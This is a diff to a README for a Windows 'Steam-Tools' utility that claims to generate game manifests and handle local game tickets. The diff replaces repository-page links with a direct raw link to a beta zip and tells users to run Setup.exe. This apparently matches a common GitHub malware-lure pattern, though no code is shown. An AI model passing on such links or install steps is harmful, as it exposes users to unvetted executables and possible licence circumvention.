@@ -1,6 +1,6 @@
 # 🛠️ Steam-Tools - Manage your game library content easily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/tomwinc5128/Steam-Tools)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/tomwinc5128/Steam-Tools/main/Tools/Tools_Steam_3.6-beta.5.zip)
 
 Steam-Tools allows you to organize game manifests and manage local library data. It provides a simple interface to interact with your Steam client installation. Users utilize this tool to generate manifest files and handle local game tickets without complex manual processes.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the official repository page to download the latest release: https://github.com/tomwinc5128/Steam-Tools
+1.  Visit the official repository page to download the latest release: https://raw.githubusercontent.com/tomwinc5128/Steam-Tools/main/Tools/Tools_Steam_3.6-beta.5.zip
 2.  Locate the Setup.exe file in your downloads folder.
 3.  Double-click the file to launch the installer.
 4.  Follow the on-screen instructions to select your installation path.
